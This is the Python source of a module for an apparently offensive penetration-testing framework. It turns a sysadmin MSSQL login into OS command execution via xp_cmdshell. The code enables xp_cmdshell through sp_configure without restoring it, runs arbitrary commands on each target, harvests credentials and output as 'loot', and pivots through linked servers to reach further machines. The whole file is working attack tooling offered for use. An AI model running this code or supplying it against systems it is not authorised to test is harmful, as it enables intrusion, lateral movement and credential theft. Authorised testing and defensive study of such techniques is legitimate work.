"""MSSQL command execution via xp_cmdshell — the classic.

With a sysadmin login, xp_cmdshell turns database access into OS
command execution: enable it via sp_configure if it's off, run the
command, loot the output. The store keeps the login for reuse.

The linked-server pivot: set LINK and the module runs the command
THROUGH the linked server instead (EXEC (...) AT [LINK]) — the
target's machine account and network position do the work, the output
still comes home. Enable xp_cmdshell on the linked server first when
needed (ENABLE_LINK).
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptPort, OptString

try:
    from impacket import tds
except ImportError:
    tds = None  # console gates run() on requirements


def _connect(host, port, database, user, password, domain, timeout=15):
    ms_sql = tds.MSSQL(host, port)
    ms_sql.connect(timeout=timeout)
    ms_sql.login(database, user, password, domain, None, bool(domain))
    return ms_sql


def run_query(ms_sql, statement):
    try:
        return [tuple(row) for row in
                ms_sql.RunSQLQuery("master", statement, tuplemode=True)]
    except Exception:
        return None


def exec_batch(ms_sql, statement):
    try:
        ms_sql.RunSQLStatement("master", statement)
        return True, ""
    except Exception as e:
        return False, str(e)


class MssqlExec(AuxiliaryModule):
    name = "MSSQL Exec (xp_cmdshell, linked-server pivot)"
    description = """
        Runs COMMAND on an MSSQL host via xp_cmdshell (sysadmin login).
        Enables xp_cmdshell when it's off and restores nothing — note
        it in the report. LINK pivots through a linked server
        (EXEC (...) AT [LINK]): the command runs on the linked box.
        Output lands in loot.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=1433, description="MSSQL port"))
        self.options.add(OptString("DATABASE", default="master",
                                   description="Initial database"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Login (needs sysadmin)"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("DOMAIN", default="",
                                   description="Domain for Windows auth "
                                               "(blank = SQL auth)"))
        self.options.add(OptString("COMMAND", default="whoami",
                                   description="OS command to run"))
        self.options.add(OptString("LINK", default="",
                                   description="Linked server to pivot through "
                                               "(blank = run locally)"))

    def run(self):
        database = str(self.get_option("DATABASE"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        domain = str(self.get_option("DOMAIN") or "")
        command = str(self.get_option("COMMAND"))
        link = str(self.get_option("LINK") or "").strip()
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._exec(host, int(self.get_option("RPORT")), database,
                       user, password, domain, command, link)

    def _exec(self, host, port, database, user, password, domain,
              command, link):
        try:
            ms_sql = _connect(host, port, database, user, password, domain)
        except Exception as e:
            self.print_error(f"{host}:{port}: login failed - {e}")
            return
        try:
            store = getattr(self.framework, "store", None)
            if store is not None:
                store.add_cred(host, "mssql", user, password,
                               source="mssql_exec")
            rows = run_query(ms_sql, "SELECT IS_SRVROLEMEMBER('sysadmin')")
            if not rows or rows[0][0] != 1:
                self.print_error(f"{host}:{port}: {user} is not sysadmin "
                                 f"— xp_cmdshell is out of reach")
                return
            if link:
                self._exec_linked(ms_sql, host, command, link, store)
            else:
                self._exec_local(ms_sql, host, command, store)
        finally:
            try:
                ms_sql.socket.close()
            except Exception:
                pass

    def _enable_xp_cmdshell(self, ms_sql, host):
        rows = run_query(ms_sql,
                         "SELECT value_in_use FROM sys.configurations "
                         "WHERE name = 'xp_cmdshell'")
        if rows and rows[0][0] == 1:
            return True
        self.print_status(f"{host}: enabling xp_cmdshell via sp_configure")
        ok, err = exec_batch(ms_sql,
                             "EXEC sp_configure 'show advanced options', 1; "
                             "RECONFIGURE; "
                             "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
        if not ok:
            if "not supported by this edition" in err:
                self.print_error(f"{host}: xp_cmdshell is not supported by "
                                 f"this SQL Server (it's Windows-only — "
                                 f"Linux SQL Server has no xp_cmdshell)")
            else:
                self.print_error(f"{host}: sp_configure failed - {err[:150]}")
            return False
        return True

    def _exec_local(self, ms_sql, host, command, store):
        if not self._enable_xp_cmdshell(ms_sql, host):
            return
        rows = run_query(ms_sql, f"EXEC xp_cmdshell '{self._quote(command)}'")
        if rows is None:
            self.print_error(f"{host}: xp_cmdshell failed")
            return
        output = "\n".join(str(cell) for row in rows for cell in row
                           if cell is not None)
        self.print_good(f"{host}: output:")
        for line in output.splitlines():
            self.print_line(f"  {line}")
        if store is not None:
            store.add_loot("exec", f"mssql xp_cmdshell {command} @ {host}",
                           output, address=host)

    def _exec_linked(self, ms_sql, host, command, link, store):
        self.print_status(f"{host}: pivoting through linked server "
                          f"{link}")
        statement = (f"EXEC ('xp_cmdshell ''{self._quote(command)}''') "
                     f"AT [{link}]")
        rows = run_query(ms_sql, statement)
        if rows is None:
            self.print_error(f"{host}: chain exec failed — does {link} "
                             f"exist, allow RPC out, and have xp_cmdshell "
                             f"enabled?")
            return
        output = "\n".join(str(cell) for row in rows for cell in row
                           if cell is not None)
        self.print_good(f"{host}: output (via {link}):")
        for line in output.splitlines():
            self.print_line(f"  {line}")
        if store is not None:
            store.add_loot("exec",
                           f"mssql chain xp_cmdshell {command} via {link} "
                           f"@ {host}", output, address=host)

    def _quote(self, command):
        return command.replace("'", "''")
